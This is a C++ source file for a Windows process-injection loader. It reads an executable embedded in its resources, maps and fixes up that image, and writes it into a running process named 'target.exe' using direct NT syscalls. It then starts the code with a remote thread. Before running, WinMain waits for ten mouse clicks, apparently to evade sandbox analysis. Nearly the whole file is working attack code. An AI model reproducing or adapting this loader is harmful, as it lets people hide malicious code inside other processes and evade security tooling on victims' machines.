
#include <windows.h>
#include <winnt.h>

#include <iostream>

#include "sourcefiles/syscalls/Syscalls_all.h"

#include "rsrc/resource.h"

//list processes
#include <tlhelp32.h>
//get module file name
#include <psapi.h>
//find()
#include <string.h>

//uncompressing
#include <stdio.h>
#include <string.h>  // for strlen
#include <assert.h>
#include "zlib.h"
#include <fstream>

//get clicks
#include <WinUser.h>

char* GlobalCharPtr;

bool ntStatusCheck(NTSTATUS ntstatus, std::string errMsg) {
    
    if (ntstatus != 0) {
        std::cout << errMsg << "\n";

        if (ntstatus == 0xC0000003) {
            printf("err => : NT_STATUS_INVALID_INFO_CLASS\n");
        }
        else if (ntstatus == 0xC0000004) {
            printf("err => : NT_STATUS_INFO_LENGTH_MISMATCH\n");
        }
        else if (ntstatus == 0xC000000d) {
            printf("err => : NT_STATUS_INVALID_PARAMETER\n");
        }
        else if (ntstatus == 0xC0000022) {
            printf("err => : NT_STATUS_ACCESS_DENIED\n");
        }
        else if (ntstatus == 0xC0000002) {
            printf("err => : NT_STATUS_NOT_IMPLEMENTED incorrect function\n");
        }
        else if (ntstatus == 0xC0000001) {
            printf("err => : NT_STATUS_UNSUCCESSFUL 	A device attached to the system is not functioning.\n");
        }
        else if (ntstatus == 0xC000009d) {
            printf("err => : NT_STATUS_DEVICE_NOT_CONNECTED 	�The device is not ready.�\n");
        }else if (ntstatus == 0xc00000bb) {
            printf("err => : NT_STATUS_NOT_SUPPORTED�\n");
        }
        else {
            std::string errmsg = "\n=> err code: %x\n";
            if (ntstatus != 0) { printf(errmsg.c_str(), ntstatus); }
        }

        return false;
    
    }

    
    return true;
}

char* parsePEbuffer(std::string PE2Load, size_t &sizeOUT) {
    
    std::string result;
    size_t exeSiz = 0;
    HGLOBAL hGlobal;
    unsigned char* exeBuf = NULL;
    char* dataptr = NULL;

    HRSRC hResource = NULL;
    hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_TEXT1), TEXT("TEXT"));
    
    if (hResource != NULL) {
        hGlobal = LoadResource(NULL, hResource);
        if (hGlobal != NULL) {
            sizeOUT = SizeofResource(NULL, hResource); // Size of the embedded data
            dataptr = (char*)LockResource(hGlobal);   // usable pointer to that data
            //result.assign(dataptr, exeSiz);
        }
    }

    return dataptr;
}

int on_Extract_Entry(const char* filename, void* arg) {
    static int i = 0;
    int n = *(int*)arg;
    //printf("Extracted: %s (%d of %d)\n", filename, ++i, n);

    return 0;
}

// void compressBuffer(char* uncompBuffArg, size_t &uncompBuffSizeArg, size_t availSize, size_t &outSize){

//     int uncompressedSize = uncompBuffSizeArg;

//     int statusInt = 0;
//     GlobalCharPtr = new char[availSize];

//     z_stream defstream;
//     defstream.zalloc = Z_NULL;
//     defstream.zfree = Z_NULL;
//     defstream.opaque = Z_NULL;
    
//     defstream.avail_in = (uInt)(uncompBuffSizeArg); // size of input, string + terminator
//     defstream.next_in = (Bytef *)uncompBuffArg; // input char array
//     defstream.avail_out = (uInt)availSize; // size of output
//     defstream.next_out = (Bytef *)GlobalCharPtr; // output char array
    
//     // the actual compression work.
//     statusInt = deflateInit(&defstream, Z_BEST_COMPRESSION);
//     std::cout << "status: " << statusInt << "\n";
//     statusInt = deflate(&defstream, Z_FINISH);
//     std::cout << "status: " << statusInt << "\n";
//     statusInt = deflateEnd(&defstream);
//     std::cout << "status: " << statusInt << "\n";

//     //outputs the compressed size
//     outSize = defstream.total_out;
// }

void decompressBuffer(char* compBuffArg, size_t &compBuffSizeArg, size_t availSize, size_t &outSize){
    int statusInt = 0;
    GlobalCharPtr = new char[availSize];

    z_stream infstream;
    infstream.zalloc = Z_NULL;
    infstream.zfree = Z_NULL;
    infstream.opaque = Z_NULL;
    
    infstream.avail_in = (uInt)(compBuffSizeArg+1); // size of input
    infstream.next_in = (Bytef *)compBuffArg; // input char array
    infstream.avail_out = (uInt)availSize; // size of output
    infstream.next_out = (Bytef *)GlobalCharPtr; // output char array
     
    // the actual DE-compression work.
    statusInt = inflateInit(&infstream);
    std::cout << "status: " << statusInt << "\n";
    statusInt = inflate(&infstream, Z_NO_FLUSH);
    std::cout << "status: " << statusInt << "\n";
    statusInt = inflateEnd(&infstream);
    std::cout << "status: " << statusInt << "\n";
    
    //outputs the uncompressed size
    outSize = infstream.total_out;
}

void load_PE(char* PE_data, std::string targetProc) {


    /** testing a dumb trick  **/
    // int counter = 0;
    // while(counter < 10000){
    //     HANDLE ProcNumNTHandle = GetCurrentProcess();
    //     counter++;
    // }
    

    /** Parse header **/

    IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*)PE_data;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*)(((char*)p_DOS_HDR) + p_DOS_HDR->e_lfanew);

    // Validte PE Infromation
    bool isPE = p_DOS_HDR->e_magic == IMAGE_DOS_SIGNATURE;
    if (!isPE)
    {
        printf("[Error] Input PE file is invalid. (Signature Mismatch)\n");
        return;
    }

    //The magic number for the image pe format is 0x10b for PE32 and 0x20b for PE32 +

    bool is64 = p_NT_HDR->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && p_NT_HDR->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    if (!is64)
    {
        printf("[Error] This file is not x64.\n");
        return;
    }



    char* hdr_image_base = (char*)p_NT_HDR->OptionalHeader.ImageBase;
    DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
    DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
    DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;

    /** Allocate Memory **/
    char* ImageBase = NULL;
    PSIZE_T imageSize_T = (PSIZE_T)size_of_image;
    PVOID ImageBasePVOID = hdr_image_base;

    //PULONG ProcNumNT = NULL;
    //NtGetCurrentProcessorNumberEx((PULONG)&ProcNumNT);
    HANDLE ProcNumNTHandle = GetCurrentProcess();

    NTSTATUS statusNTAlloc = NtAllocateVirtualMemory((HANDLE)ProcNumNTHandle, &ImageBasePVOID, 0, (PSIZE_T)&imageSize_T, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ImageBase = (char*)ImageBasePVOID;

    if (statusNTAlloc != 0) {
        ImageBasePVOID = NULL;
        statusNTAlloc = NtAllocateVirtualMemory((HANDLE)ProcNumNTHandle, &ImageBasePVOID, 0, (PSIZE_T)&size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ImageBase = (char*)ImageBasePVOID;

        ntStatusCheck(statusNTAlloc, "NtAllocateVirtualMemory err:");
        if (statusNTAlloc != 0) {
            //GetLastErrorAsString();
            /*
            ImageBase = (char*)VirtualAlloc(hdr_image_base, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (ImageBase == NULL) {
                ImageBase = (char*)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                if (ImageBase == NULL) { return NULL; }
            }
            */
        }
    }

    /** Map PE sections in memory **/

    memcpy(ImageBase, PE_data, p_NT_HDR->OptionalHeader.SizeOfHeaders);


    // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);

    // For each sections
    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        // calculate the VA we need to copy the content, from the RVA 
        // section[i].VirtualAddress is a RVA, mind it
        char* dest = ImageBase + sections[i].VirtualAddress;

        // check if there is Raw data to copy
        if (sections[i].SizeOfRawData > 0) {
            // We copy SizeOfRaw data bytes, from the offset PointertoRawData in the file
            memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
        else {
            memset(dest, 0, sections[i].Misc.VirtualSize);
        }
    }

    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;
    
    /** Handle imports **/

    // load the address of the import descriptors array
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // this array is null terminated
    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {

        // Get the name of the dll, and import it
        char* module_name = ImageBase + import_descriptors[i].Name;
        printf("\n[*__*] adding functions from Module: %s\n", module_name);
        HMODULE import_module = LoadLibraryA(module_name);
        if (import_module == NULL) {
            printf("[*] import module err ------------------------------------------------\n");
            return;
        }

        // the lookup table points to function names or ordinals => it is the INT
        IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].OriginalFirstThunk);

        // the address table is a copy of the lookup table at first
        // but we put the addresses of the loaded function inside => that's the IAT
        IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].FirstThunk);

        // null terminated array, again
        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void* function_handle = NULL;

            // Check the lookup table for the adresse of the function name to import
            unsigned long long lookup_addr = lookup_table[i].u1.AddressOfData;

            if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { //if first bit is not 1
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME*)(ImageBase + lookup_addr);
                // this struct points to the ASCII function name
                char* funct_name = (char*)&(image_import->Name);
                printf("[*] adding address of: %s -- byName\n", funct_name);
                // get that function address from it's module and name
                function_handle = (void*)GetProcAddress(import_module, funct_name);
            }
            //ordinal of 64bit
            else if (lookup_table[i].u1.Ordinal && IMAGE_ORDINAL_FLAG64) {
                //You have some difference in the import table when you look for name or ordinal in import functions bit is masked as 0x80000000 for PE32, 0x8000000000000000 for PE32+
                printf("[*] missing with the bits--------------------------------------\n");
                printf("[*] adding address by ordinal64------------------------------------------\n");
                lookup_addr &= 0x000000000000ffff;

                function_handle = (void*)GetProcAddress(import_module, (LPCSTR)lookup_addr);
            }
            //ordinal of 32bit
            else {
                printf("[*] missing with the bits--------------------------------------\n");
                printf("[*] adding address by ordinal32--------------------------------------\n");
                // import by ordinal, directly
                //lookup_addr &= 0x0000ffff; //setting the high part to ZERO
                lookup_addr &= 0x000000000000ffff; //setting the high part to ZERO
                function_handle = (void*)GetProcAddress(import_module, (LPCSTR)lookup_addr);
            }

            if (function_handle == NULL) { 
                printf("[*] function handle  err ------------------------------------------------\n"); 
                return; 
            }

            // change the IAT, and put the function address inside.
            address_table[i].u1.Function = reinterpret_cast<DWORD_PTR>(function_handle);
        }

        printf("[*] out of DLL\n");
    }

    //////TODO

    HANDLE targetProcess = NULL;
    

    char procFileNameBuf[MAX_PATH];
    //get explorer handle
    while (true) {
        NtGetNextProcess(targetProcess, MAXIMUM_ALLOWED, 0, 0, &targetProcess);

        if (targetProcess == NULL) break;

        GetModuleFileNameExA(targetProcess, 0, (LPSTR)&procFileNameBuf, MAX_PATH);
        std::string procFileNameStr = procFileNameBuf;
        size_t found = procFileNameStr.find(targetProc, 0);
        if (found != std::string::npos) {
            //printf("process handle: %d\n", targetProcess);
            //std::cout << "process file name: " << procFileNameStr << "\n";
            break;
        }
    }

    

    PVOID RemoteImageBase = hdr_image_base;
    statusNTAlloc = NtAllocateVirtualMemory((HANDLE)targetProcess, &RemoteImageBase, 0, (PSIZE_T)&imageSize_T, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ImageBase = (char*)ImageBasePVOID;

    if (statusNTAlloc != 0) {
        ImageBasePVOID = NULL;
        statusNTAlloc = NtAllocateVirtualMemory((HANDLE)targetProcess, &RemoteImageBase, 0, (PSIZE_T)&size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ntStatusCheck(statusNTAlloc, "NtAllocateVirtualMemory Remote err:");
        ImageBase = (char*)ImageBasePVOID;

    }


    NtWriteVirtualMemory(targetProcess, RemoteImageBase, (PVOID)ImageBasePVOID, (SIZE_T)imageSize_T, NULL);
    //WriteProcessMemory(targetProcess, RemoteImageBase, (PVOID)ImageBasePVOID, (SIZE_T)imageSize_T, NULL);
    char* RemoteImageBaseChar = (char*)RemoteImageBase;


    /** Handle relocations **/

    //this is how much we shifted the ImageBase
    DWORD_PTR delta_VA_reloc = (reinterpret_cast<DWORD_PTR>(RemoteImageBase)) - p_NT_HDR->OptionalHeader.ImageBase;

    // if there is a relocation table, and we actually shitfted the ImageBase
    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {
        //printf("\n[*] The allocated address is not the prefered address, started relocating\n");
        //calculate the relocation table address
        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*)(RemoteImageBaseChar + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        //once again, a null terminated array
        while (p_reloc->VirtualAddress != 0) {
            // how many relocations in this block
            // ie the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
            //std::cout << sizeof(WORD) << "\n"; sizeof word is 2
            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            // the first relocation element in the block, right after the header (using pointer arithmetic again)
            WORD* reloc = (WORD*)(p_reloc + 1);
            for (int i = 0; i < size; ++i) {
                //type is the first 4 bits of the relocation word
                int type = reloc[i] >> 12;

                // offset is the last 12 bits
                int offset = reloc[i] & 0x0fff;

                //this is the address we are going to change
                //DWORD* is enough in only 32
                unsigned long long int* change_addr = (unsigned long long int*)(RemoteImageBaseChar + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change
                switch (type) {
#if defined (_WIN64)
                case IMAGE_REL_BASED_DIR64://for x64
                    *change_addr += delta_VA_reloc;
                    break;
#elif(_WIN32)
                case IMAGE_REL_BASED_HIGHLOW://for x86
                    *change_addr += delta_VA_reloc;
                    break;
#endif
                default:
                    break;
                }
            }

            // switch to the next relocation block, based on the size
            p_reloc = (IMAGE_BASE_RELOCATION*)((reinterpret_cast<DWORD_PTR>(p_reloc)) + p_reloc->SizeOfBlock);
        }
    }


    /** Map PE sections privileges **/
    //Set permission for the PE hader to read only

    ULONG OldProtec = NULL;
    SIZE_T SizeOfHeadersNT = (SIZE_T)p_NT_HDR->OptionalHeader.SizeOfHeaders;
    NTSTATUS NTStatusMemProtect = NtProtectVirtualMemory(targetProcess, &RemoteImageBase, &SizeOfHeadersNT, PAGE_READONLY, &OldProtec);
    ntStatusCheck(statusNTAlloc, "NtProtectVirtualMemory Remote err:");

    //DWORD oldProtect;
    //VirtualProtect(ImageBase, p_NT_HDR->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);

    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        char* dest = RemoteImageBaseChar + sections[i].VirtualAddress;
        DWORD s_perm = sections[i].Characteristics;
        DWORD v_perm = 0; //flags are not the same between virtal protect and the section header
        if (s_perm & IMAGE_SCN_MEM_EXECUTE) {v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;}
        else {v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;}

        SizeOfHeadersNT = (SIZE_T)sections[i].Misc.VirtualSize;
        PVOID basePlsSection = dest;
        NTStatusMemProtect = NtProtectVirtualMemory(targetProcess, &basePlsSection, &SizeOfHeadersNT, v_perm, &OldProtec);
        ntStatusCheck(statusNTAlloc, "NtProtectVirtualMemory Remote err:");
        if (NTStatusMemProtect != 0) {
            printf("err code %x --", (void*)NTStatusMemProtect);
            std::cout << "NT memprotect failed\n";
        }
        //VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, &oldProtect);
    }

    printf("\n[+] reserved Address: %#llx", RemoteImageBaseChar);
    printf("\n[+] Image Raw Size: %llx\n", size_of_image);

    // DWORD ThreadId = NULL;
    // CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)(RemoteImageBaseChar + entry_point_RVA) + delta_VA_reloc), NULL, 0, (PDWORD)&ThreadId);
    // std::cout << "[+] the thread ID is: " << ThreadId;



//NT version===========================================
    HANDLE RemThreadHandle = NULL;
    //NtCreateThreadEx
    MakeTh(&RemThreadHandle, THREAD_ALL_ACCESS, NULL, targetProcess, (void*)(RemoteImageBaseChar + entry_point_RVA), NULL, 0, 0, 0, 0, NULL);
    std::cout << "the thread ID is: " << RemThreadHandle;

    CloseHandle(targetProcess);
    //NtFreeVirtualMemory(GetCurrentProcess(), &ImageBasePVOID, imageSize_T, IN ULONG FreeType);
}

//int main()
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

    //wait for 10 clicks
    int counter = 0;
    while(counter < 10){if(GetAsyncKeyState(VK_LBUTTON)){counter++;}Sleep(100);}

    size_t size = 0;
    size_t outSize = 0;
    char* MsgPtr = NULL;

    MsgPtr = parsePEbuffer("resource1", size);

    //compressBuffer(MsgPtr, size, 200000, outSize);
    //std::cout << "compressed size: " << size << "\n";
    // std::cout << "compressed msg: " << GlobalCharPtr << "\n";

    // std::ofstream ofile("src//rsrc/resource.bin.compressed");
    // ofile.write(GlobalCharPtr, outSize);
    // ofile.close();

    // exit(0);

    //MsgPtr = GlobalCharPtr;
    //decompressBuffer(MsgPtr, size, 500000, outSize);
    // std::cout << "uncompressed size: " << outSize << "\n";
    //std::cout << "uncompressed msg: " << GlobalCharPtr << "\n";

    // std::ofstream ofile2("src//rsrc/output_uncomp.exe");
    // ofile2.write(MsgPtr, size);
    // ofile2.close();

/*
*/
    //void* start_address = load_PE(GlobalCharPtr, "target.exe");
    load_PE(MsgPtr, "target.exe");

    delete[] GlobalCharPtr;

    //getchar();
}